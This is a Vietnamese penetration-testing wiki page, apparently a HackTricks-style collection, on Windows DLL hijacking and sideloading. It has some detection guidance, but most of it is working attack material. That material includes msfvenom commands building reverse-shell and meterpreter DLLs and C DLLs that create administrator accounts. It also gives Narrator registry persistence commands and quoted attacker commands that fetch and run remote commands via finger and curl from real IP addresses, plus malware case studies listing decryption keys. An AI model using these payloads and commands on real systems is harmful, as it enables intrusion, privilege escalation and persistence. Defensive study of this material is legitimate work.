Ý tưởng săn tìm:
- Các **tệp thực thi .NET** đã ký hoặc hợp lệ theo cách khác, chạy cùng các tệp **`.config`** đáng ngờ trong những vị trí mà người dùng có quyền ghi.
- Tệp `.config` chứa **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** hoặc **`etwEnable enabled="false"`**.
- Scheduled task khởi chạy lại các binary update đã đổi tên từ **`%LOCALAPPDATA%`** hoặc các thư mục `\bin\update\` dành riêng cho ứng dụng.
- Chuỗi tiến trình cha/con trong đó scheduled task khởi chạy một .NET host đáng tin cậy, rồi host này lập tức tải các assembly không thuộc nhà cung cấp từ chính thư mục của nó.

#### Các ngoại lệ đối với thứ tự tìm kiếm DLL theo tài liệu Windows

Tài liệu Windows ghi nhận một số ngoại lệ đối với thứ tự tìm kiếm DLL tiêu chuẩn:

- Khi gặp một **DLL trùng tên với DLL đã được tải vào bộ nhớ**, hệ thống bỏ qua quy trình tìm kiếm thông thường. Thay vào đó, hệ thống kiểm tra chuyển hướng và manifest trước khi dùng DLL đã có trong bộ nhớ. **Trong trường hợp này, hệ thống không tìm kiếm DLL**.
- Nếu DLL được nhận diện là **known DLL** của phiên bản Windows hiện tại, hệ thống sẽ sử dụng phiên bản known DLL của nó cùng với mọi DLL phụ thuộc, **bỏ qua quy trình tìm kiếm**. Khóa registry **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** chứa danh sách các known DLL này.
- Nếu một **DLL có các dependency**, hệ thống tìm kiếm những DLL phụ thuộc đó như thể chúng chỉ được chỉ định bằng **tên module**, bất kể DLL ban đầu được xác định bằng đường dẫn đầy đủ hay không.

### Leo thang đặc quyền

**Yêu cầu**:

- Xác định một tiến trình đang chạy hoặc sẽ chạy với **đặc quyền khác** (di chuyển ngang hoặc di chuyển lateral), nhưng **thiếu một DLL**.
- Đảm bảo có **quyền ghi** vào bất kỳ **thư mục** nào sẽ được dùng để **tìm kiếm DLL**. Vị trí này có thể là thư mục chứa executable hoặc một thư mục nằm trong system path.

Các điều kiện tiên quyết này thường không có sẵn theo mặc định: executable có đặc quyền thường không thiếu dependency DLL, và người dùng thông thường thường không thể ghi vào các thư mục trong system search path. Tuy nhiên, môi trường cấu hình sai vẫn có thể để lộ cả hai điều kiện này.\
Nếu đáp ứng các yêu cầu, hãy kiểm tra dự án [UACME](https://github.com/hfiref0x/UACME). Mặc dù mục tiêu chính của dự án là UAC bypass, dự án có các PoC DLL hijacking dành cho một số phiên bản Windows cụ thể và thường có thể điều chỉnh để dùng với thư mục có quyền ghi mà bạn tìm thấy.

Lưu ý rằng bạn có thể **kiểm tra quyền trong một thư mục** bằng cách chạy:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Và **kiểm tra quyền của tất cả các thư mục bên trong PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bạn cũng có thể kiểm tra imports của một file thực thi và exports của một DLL bằng cách:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Để xem hướng dẫn đầy đủ về cách **abuse DLL Hijacking để leo thang đặc quyền** khi có quyền ghi vào một **thư mục System Path**, hãy xem:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Công cụ tự động

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sẽ kiểm tra xem bạn có quyền ghi vào thư mục nào bên trong system PATH hay không.\
Các công cụ tự động thú vị khác để phát hiện lỗ hổng này là các hàm **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ và _Write-HijackDll._

### Ví dụ

Nếu tìm thấy một tình huống có thể khai thác, một trong những điều quan trọng nhất để khai thác thành công là **tạo một dll export ít nhất tất cả các hàm mà executable sẽ import từ dll đó**. Dù vậy, hãy lưu ý rằng DLL Hijacking rất hữu ích để [leo thang từ mức Medium Integrity lên High **(bypass UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) hoặc từ[ **High Integrity lên SYSTEM**](../index.html#from-high-integrity-to-system)**.** Bạn có thể xem ví dụ về **cách tạo một dll hợp lệ** trong bài nghiên cứu DLL hijacking tập trung vào việc thực thi: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ngoài ra, trong **phần tiếp theo**, bạn sẽ tìm thấy một số **mã dll cơ bản** có thể hữu ích làm **template** hoặc để tạo một **dll export các hàm không bắt buộc**.

## **Tạo và biên dịch DLL**

### **DLL Proxifying**

Về cơ bản, **DLL proxy** là một DLL có khả năng **thực thi mã độc của bạn khi được load**, đồng thời **expose** và **hoạt động** như **dự kiến** bằng cách **chuyển tiếp tất cả các lệnh gọi đến library thực**.

Với công cụ [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) hoặc [**Spartacus**](https://github.com/Accenture/Spartacus), bạn có thể **chỉ định một executable và chọn library** muốn proxify để **tạo một dll đã proxify**, hoặc **chỉ định DLL** rồi **tạo một dll đã proxify**.

### **Meterpreter**

**Lấy rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Lấy một meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Tạo người dùng (x86, tôi không thấy phiên bản x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Tự tạo

Trong nhiều trường hợp, DLL bạn biên dịch phải **export mọi hàm được tiến trình nạn nhân import**. Nếu thiếu một export bắt buộc, binary không thể phân giải hàm đó và exploit sẽ thất bại.

<details>
<summary>Mẫu DLL C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Ví dụ DLL C++ tạo người dùng</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C thay thế có điểm vào luồng</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT với khởi tạo được kích hoạt bởi export

Một **thư viện chia sẻ .NET NativeAOT độc lập** có thể được dùng làm DLL native được cấy mà không cần triển khai `DllMain` tường minh. Export các phương thức C# static bằng `[UnmanagedCallersOnly(EntryPoint = "...")]`; khi native host gọi một trong các entry point do compiler tạo ra này, NativeAOT sẽ khởi tạo module và phương thức `[ModuleInitializer]` chạy trước phần thân C# được export. Output không yêu cầu cài đặt riêng .NET runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL vẫn cần có **tên export và chữ ký tương thích ABI** mà host được chọn thực sự gọi. Các stub tối thiểu có thể đủ để kích hoạt khởi tạo, nhưng thiếu export có thể khiến việc tải thất bại, còn chữ ký không chính xác có thể làm hỏng lời gọi. Liệt kê các import của host và xác thực kết quả bằng `dumpbin /exports payload.dll` trước khi đổi tên output thành tên dependency mà host mong đợi.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL export NativeAOT tối thiểu</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Cấu hình dự án thành một thư viện chia sẻ native của Windows độc lập:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Đặt DLL đã đổi tên cạnh executable dễ bị tấn công đã sao chép và khởi chạy host thông qua đường dẫn mã gọi export tương thích. Cách tiếp cận dùng initializer này tránh đặt các thao tác phức tạp trực tiếp trong `DllMain`, nhưng các điều kiện tiên quyết của sideload vẫn không đổi: loader phải phân giải dependency theo tên, chọn thư mục ứng dụng và không tìm thấy dependency trước đó qua KnownDLLs, module đã được tải, chuyển hướng SxS hoặc các cờ `LOAD_LIBRARY_SEARCH_*` bị hạn chế.<sup>[[26]](#references)[[30]](#references)</sup>

Để xem các template native thông thường, hãy tham khảo [Windows C payloads](../windows-c-payloads.md). Giai đoạn đầu được sideload có thể tiếp tục thực hiện [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), nhưng đó là một kỹ thuật injection riêng, không phải một phần của quá trình phân giải DLL.

## Phát hiện: DLL masquerading trong các lần tải thư viện

Elastic Defend 9.5.0 bổ sung vào sự kiện tải thư viện trường `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` khi tệp được tải không có chữ ký của Microsoft và tên tệp trùng với tên trong danh mục DLL Windows/system được Elastic lưu trong cache. Nhờ đó, việc kiểm tra danh mục tên tệp, vị trí hệ thống và chữ ký được chuyển sang sensor endpoint; vì vậy, EQL cốt lõi có thể được rút gọn thành:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Xem dữ liệu bổ sung là một pivot có giá trị cao, chứ không phải bằng chứng tự thân. Tăng mức độ tin cậy khi một host đã ký tải DLL từ thư mục **có thể ghi bởi người dùng** của chính nó, DLL không được ký/không đáng tin cậy và `dll.Ext.relative_file_creation_time` cho thấy DLL được tạo ngay trước khi tải. Giới hạn ngoại lệ theo chính xác nhà phát hành + tiến trình host + đường dẫn cài đặt; không loại trừ toàn cục một tên DLL trùng khớp vì trình cài đặt và ứng dụng hợp lệ có thể chứa các thư viện riêng mang tên giống thư viện hệ thống.<sup>[[26]](#references)</sup>

Trên các sensor không có dữ liệu bổ sung đó, hãy xấp xỉ hành vi bằng cách đối chiếu tên DLL trùng khớp với đường dẫn tải không thuộc hệ thống, chữ ký Microsoft không có/không đáng tin cậy và khoảng thời gian ngắn từ lúc tạo file đến lúc tải. Cách này đòi hỏi duy trì danh sách tên DLL và đặt ngoại lệ cụ thể cho `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` cùng các đường dẫn triển khai được phê duyệt khác.<sup>[[26]](#references)</sup>

## Nghiên cứu tình huống: DLL localization TTS OneCore của Narrator bị chiếm quyền (Trợ năng/AT)

Windows Narrator.exe vẫn dò tìm một DLL localization cụ thể theo ngôn ngữ, với đường dẫn có thể dự đoán được, khi khởi động; DLL này có thể bị chiếm quyền để thực thi mã tùy ý và duy trì quyền truy cập.<sup>[[7]](#references)</sup>

Thông tin chính
- Đường dẫn dò tìm (các bản dựng hiện tại): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Đường dẫn cũ (các bản dựng trước đây): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Nếu có DLL do kẻ tấn công kiểm soát và có thể ghi tại đường dẫn OneCore, DLL sẽ được tải và `DllMain(DLL_PROCESS_ATTACH)` sẽ thực thi. Không cần export nào.

Phát hiện bằng Procmon
- Bộ lọc: `Process Name is Narrator.exe` và `Operation is Load Image` hoặc `CreateFile`.
- Khởi chạy Narrator và quan sát lần tải thử đường dẫn nêu trên.

DLL tối thiểu
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC im lặng
- Một lần hijack ngây thơ sẽ phát ra âm thanh/hiển thị giao diện người dùng. Để hoạt động im lặng, khi attach, hãy liệt kê các thread của Narrator, mở thread chính (`OpenThread(THREAD_SUSPEND_RESUME)`) rồi `SuspendThread` thread đó; tiếp tục thực thi trên thread của bạn. Xem PoC để biết toàn bộ mã.<sup>[[8]](#references)</sup>

Kích hoạt và duy trì quyền truy cập qua cấu hình Accessibility
- Ngữ cảnh người dùng (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Với các thiết lập trên, khi khởi chạy Narrator, DLL đã được cài vào sẽ được tải. Trên secure desktop (màn hình đăng nhập), nhấn CTRL+WIN+ENTER để khởi chạy Narrator; DLL của bạn sẽ thực thi với quyền SYSTEM trên secure desktop.

Thực thi SYSTEM qua RDP (di chuyển ngang)
- Cho phép lớp bảo mật RDP cổ điển: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Kết nối RDP đến host, tại màn hình đăng nhập nhấn CTRL+WIN+ENTER để khởi chạy Narrator; DLL của bạn sẽ thực thi với quyền SYSTEM trên secure desktop.
- Quá trình thực thi dừng khi phiên RDP đóng—hãy inject/migrate ngay.

Bring Your Own Accessibility (BYOA)
- Bạn có thể sao chép một mục registry Accessibility Tool (AT) tích hợp sẵn (ví dụ: CursorIndicator), chỉnh sửa để trỏ đến một binary/DLL tùy ý, import mục đó, rồi đặt `configuration` thành tên AT tương ứng. Cách này proxy việc thực thi tùy ý thông qua framework Accessibility.

Ghi chú
- Ghi vào `%windir%\System32` và thay đổi giá trị HKLM cần quyền admin.
- Toàn bộ logic payload có thể đặt trong `DLL_PROCESS_ATTACH`; không cần export nào.

## Nghiên cứu điển hình: CVE-2025-1729 - Leo thang đặc quyền bằng TPQMAssistant.exe

Trường hợp này minh họa **Phantom DLL Hijacking** trong TrackPoint Quick Menu của Lenovo (`TPQMAssistant.exe`), được theo dõi với mã **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Chi tiết lỗ hổng

- **Thành phần**: `TPQMAssistant.exe` nằm tại `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` chạy hằng ngày lúc 9:30 AM trong ngữ cảnh của người dùng đã đăng nhập.
- **Quyền thư mục**: `CREATOR OWNER` có quyền ghi, cho phép người dùng cục bộ thả các file tùy ý vào đó.
- **Hành vi tìm kiếm DLL**: Chương trình thử tải `hostfxr.dll` từ thư mục làm việc trước và ghi log "NAME NOT FOUND" nếu không tìm thấy, cho thấy thư mục cục bộ được ưu tiên tìm kiếm.

### Triển khai khai thác

Kẻ tấn công có thể đặt một file stub `hostfxr.dll` độc hại trong cùng thư mục, khai thác DLL bị thiếu để thực thi mã trong ngữ cảnh của người dùng:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Luồng tấn công

1. Với tư cách người dùng thông thường, đặt `hostfxr.dll` vào `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Chờ scheduled task chạy lúc 9:30 AM trong ngữ cảnh của người dùng hiện tại.
3. Nếu quản trị viên đăng nhập khi task thực thi, DLL độc hại sẽ chạy trong phiên của quản trị viên với mức toàn vẹn trung bình.
4. Kết hợp các kỹ thuật UAC bypass tiêu chuẩn để nâng quyền từ mức toàn vẹn trung bình lên quyền SYSTEM.

## Nghiên cứu tình huống: MSI CustomAction Dropper + DLL Side-Loading thông qua Signed Host (wsc_proxy.exe)

Các tác nhân đe dọa thường kết hợp dropper dựa trên MSI với DLL side-loading để thực thi payload trong một tiến trình đáng tin cậy, đã ký.<sup>[[10]](#references)</sup>

Tổng quan chuỗi tấn công
- Người dùng tải xuống MSI. CustomAction chạy âm thầm trong quá trình cài đặt GUI (ví dụ: hành động LaunchApplication hoặc VBScript), tái tạo stage tiếp theo từ các tài nguyên nhúng.
- Dropper ghi một EXE hợp lệ, đã ký và một DLL độc hại vào cùng thư mục (ví dụ cặp: wsc_proxy.exe do Avast ký + wsc.dll do kẻ tấn công kiểm soát).
- Khi EXE đã ký được khởi chạy, thứ tự tìm kiếm DLL của Windows sẽ tải wsc.dll từ thư mục làm việc trước, thực thi mã của kẻ tấn công trong một tiến trình cha đã ký (ATT&CK T1574.001).

Phân tích MSI (cần tìm gì)
- Bảng CustomAction:
  - Tìm các mục chạy tệp thực thi hoặc VBScript. Mẫu đáng ngờ, ví dụ: LaunchApplication thực thi một tệp nhúng ở chế độ nền.
  - Trong Orca (Microsoft Orca.exe), kiểm tra các bảng CustomAction, InstallExecuteSequence và Binary.
- Payload được nhúng/chia nhỏ trong CAB của MSI:
  - Giải nén theo phương thức quản trị: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Hoặc dùng lessmsi: lessmsi x package.msi C:\out
  - Tìm nhiều mảnh nhỏ được nối lại và giải mã bằng CustomAction VBScript. Luồng thường gặp:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading thực tế với wsc_proxy.exe
- Đặt hai tệp này trong cùng một thư mục:
  - wsc_proxy.exe: host hợp lệ có chữ ký (Avast). Tiến trình cố tải wsc.dll theo tên từ thư mục của nó.
  - wsc.dll: DLL của attacker. Nếu không cần export cụ thể, chỉ cần DllMain; nếu không, hãy tạo proxy DLL và chuyển tiếp các export cần thiết đến thư viện thật, đồng thời chạy payload trong DllMain.
- Tạo payload DLL tối giản:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Đối với yêu cầu export, hãy dùng framework proxy (ví dụ: DLLirant/Spartacus) để tạo DLL forwarding đồng thời thực thi payload.

- Kỹ thuật này dựa vào việc host binary phân giải tên DLL. Nếu host dùng đường dẫn tuyệt đối hoặc các cờ tải an toàn (ví dụ: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), việc hijack có thể thất bại.
- KnownDLLs, SxS và các export được forward có thể ảnh hưởng đến thứ tự ưu tiên; cần cân nhắc chúng khi chọn host binary và tập export.

## Bộ ba tệp có chữ ký + payload được mã hóa (case study ShadowPad)

Check Point mô tả cách Ink Dragon triển khai ShadowPad bằng **bộ ba tệp** để hòa lẫn vào phần mềm hợp pháp, đồng thời giữ payload cốt lõi được mã hóa trên đĩa:<sup>[[12]](#references)</sup>

1. **EXE host có chữ ký** – các nhà cung cấp như AMD, Realtek hoặc NVIDIA bị lợi dụng (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Kẻ tấn công đổi tên executable để trông giống binary Windows (ví dụ: `conhost.exe`), nhưng chữ ký Authenticode vẫn hợp lệ.
2. **DLL loader độc hại** – được thả cạnh EXE với tên được mong đợi (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL thường là binary MFC bị làm rối bằng framework ScatterBrain; nhiệm vụ duy nhất của nó là tìm blob đã mã hóa, giải mã blob rồi ánh xạ ShadowPad theo phương thức reflectively.
3. **Blob payload được mã hóa** – thường được lưu dưới dạng `<name>.tmp` trong cùng thư mục. Sau khi ánh xạ payload đã giải mã vào bộ nhớ, loader xóa tệp TMP để hủy bằng chứng pháp y.

Ghi chú về tradecraft:

* Đổi tên EXE có chữ ký (trong khi giữ nguyên `OriginalFileName` ban đầu trong PE header) giúp nó giả dạng binary Windows nhưng vẫn giữ chữ ký của nhà cung cấp. Vì vậy, hãy mô phỏng cách Ink Dragon thường thả các binary trông như `conhost.exe` nhưng thực chất là tiện ích AMD/NVIDIA.
* Vì executable vẫn được tin cậy, phần lớn cơ chế allowlisting chỉ cần DLL độc hại nằm cạnh nó. Hãy tập trung tùy chỉnh loader DLL; thường có thể để nguyên parent đã ký.
* Trình giải mã của ShadowPad yêu cầu blob TMP nằm cạnh loader và có quyền ghi để có thể xóa trắng tệp sau khi ánh xạ. Giữ thư mục có quyền ghi cho đến khi payload được tải; khi đã nằm trong bộ nhớ, có thể xóa tệp TMP an toàn để phục vụ OPSEC.

### Chuỗi sideloading với LOLBAS stager + archive phân giai đoạn (finger → tar/curl → WMI)

Các operator kết hợp DLL sideloading với LOLBAS để artifact tùy chỉnh duy nhất trên đĩa là DLL độc hại nằm cạnh EXE đáng tin cậy:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell ẩn chạy `cmd.exe /c`, lấy lệnh từ máy chủ Finger rồi chuyển chúng cho `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` lấy văn bản qua TCP/79; `| cmd` thực thi phản hồi từ server, cho phép operator thay đổi second stage ở phía server.

- **Tải xuống/giải nén tích hợp:** Tải archive với phần mở rộng vô hại, giải nén và đặt mục tiêu sideload cùng DLL trong một thư mục `%LocalAppData%` ngẫu nhiên:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ẩn thông tin tiến trình và theo các redirect; `tar -xf` sử dụng tar tích hợp sẵn của Windows.

- **Khởi chạy WMI/CIM:** Khởi chạy EXE qua WMI để telemetry ghi nhận đây là tiến trình được tạo bởi CIM trong khi EXE tải DLL nằm cùng thư mục:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hoạt động với các binary ưu tiên DLL cục bộ (ví dụ: `intelbq.exe`, `nearby_share.exe`); payload (ví dụ: Remcos) chạy dưới tên đáng tin cậy.

- **Săn tìm:** Cảnh báo khi `forfiles` xuất hiện đồng thời với `/p`, `/m` và `/c`; cách kết hợp này ít phổ biến ngoài các script quản trị.


## Nghiên cứu tình huống: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Một vụ xâm nhập Lotus Blossom gần đây đã lạm dụng chuỗi cập nhật đáng tin cậy để phát tán một dropper đóng gói bằng NSIS, triển khai DLL sideload cùng các payload chạy hoàn toàn trong bộ nhớ.<sup>[[13]](#references)</sup>

Luồng tradecraft
- `update.exe` (NSIS) tạo `%AppData%\Bluetooth`, đánh dấu thư mục là **HIDDEN**, thả một bản Bitdefender Submission Wizard đã đổi tên thành `BluetoothService.exe`, một `log.dll` độc hại và một blob đã mã hóa tên `BluetoothService`, sau đó khởi chạy EXE.
- Host EXE import `log.dll` và gọi `LogInit`/`LogWrite`. `LogInit` dùng mmap để tải blob; `LogWrite` giải mã blob bằng thuật toán stream tùy chỉnh dựa trên LCG (các hằng số **0x19660D** / **0x3C6EF35F**, khóa được tạo từ một hash trước đó), ghi đè buffer bằng shellcode dạng rõ, giải phóng các vùng nhớ tạm rồi nhảy tới shellcode.
- Để tránh dùng IAT, loader phân giải API bằng cách hash tên export, sử dụng **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, sau đó áp dụng phép avalanche kiểu Murmur (**0x85EBCA6B**) và so sánh với các hash mục tiêu đã thêm salt.

Shellcode chính (Chrysalis)
- Giải mã một module chính có cấu trúc giống PE bằng cách lặp lại các phép cộng/XOR/trừ với khóa `gQ2JR&9;` qua năm lượt, sau đó tải động `Kernel32.dll` → `GetProcAddress` để hoàn tất việc phân giải import.
- Dựng lại các chuỗi tên DLL khi chạy bằng các phép biến đổi xoay bit/XOR trên từng ký tự, rồi tải `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Sử dụng resolver thứ hai, duyệt **PEB → InMemoryOrderModuleList**, phân tích từng bảng export theo các khối 4 byte bằng phép trộn kiểu Murmur, và chỉ dùng `GetProcAddress` dự phòng khi không tìm thấy hash.

Cấu hình nhúng & C2
- Cấu hình nằm bên trong file `BluetoothService` đã được thả, tại **offset 0x30808** (kích thước **0x980**), và được giải mã bằng RC4 với khóa `qwhvb^435h&*7`, làm lộ URL C2 và User-Agent.
- Beacon tạo hồ sơ host phân tách bằng dấu chấm, thêm tiền tố tag `4Q`, rồi mã hóa bằng RC4 với khóa `vAuig34%^325hGV` trước khi gọi `HttpSendRequestA` qua HTTPS. Phản hồi được giải mã bằng RC4 và xử lý theo tag bằng switch (`4T` shell, `4V` thực thi process, `4W/4X` ghi file, `4Y` đọc/exfil, `4\\` gỡ cài đặt, `4` liệt kê ổ đĩa/file + các trường hợp truyền dữ liệu theo khối).
- Chế độ thực thi được điều khiển bằng CLI args: không có args = cài persistence (service/Run key) trỏ tới `-i`; `-i` khởi chạy lại chính nó với `-k`; `-k` bỏ qua bước cài đặt và chạy payload.

Loader thay thế được quan sát
- Cùng vụ xâm nhập này đã thả Tiny C Compiler và thực thi `svchost.exe -nostdlib -run conf.c` từ `C:\ProgramData\USOShared\`, với `libtcc.dll` đặt cạnh nó. Mã nguồn C do attacker cung cấp nhúng shellcode, được biên dịch và chạy trong bộ nhớ mà không ghi PE xuống đĩa. Có thể tái tạo bằng:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Giai đoạn compile-and-run dựa trên TCC này import `Wininet.dll` lúc runtime và tải shellcode giai đoạn hai từ một URL hardcoded, tạo ra một loader linh hoạt giả dạng một lần chạy compiler.

## DLL sideloading với export proxying + host thread parking

Một số chuỗi DLL sideloading bổ sung **kỹ thuật đảm bảo tính ổn định** để tiến trình host hợp pháp tiếp tục chạy đủ lâu, giúp tải các giai đoạn sau một cách trơn tru thay vì bị crash sau khi DLL độc hại được tải.<sup>[[11]](#references)</sup>

Mẫu được quan sát
- Đặt một EXE đáng tin cậy cạnh một DLL độc hại, dùng tên dependency được mong đợi, chẳng hạn `version.dll`.
- DLL độc hại **proxy mọi export được mong đợi** về DLL hệ thống thật (ví dụ `%SystemRoot%\\System32\\version.dll`) để quá trình phân giải import vẫn thành công và tiến trình host tiếp tục hoạt động.
- Sau khi được tải, DLL độc hại **patch entry point của host** để main thread rơi vào vòng lặp `Sleep` vô hạn thay vì thoát hoặc chạy các code path khiến tiến trình kết thúc.
- Một thread mới thực hiện công việc độc hại thực sự: giải mã tên hoặc đường dẫn DLL ở giai đoạn tiếp theo (RC4/XOR thường được dùng), rồi khởi chạy DLL đó bằng `LoadLibrary`.

Tại sao điều này quan trọng
- DLL proxying thông thường duy trì khả năng tương thích API, nhưng không đảm bảo host tiếp tục chạy đủ lâu cho các giai đoạn sau.
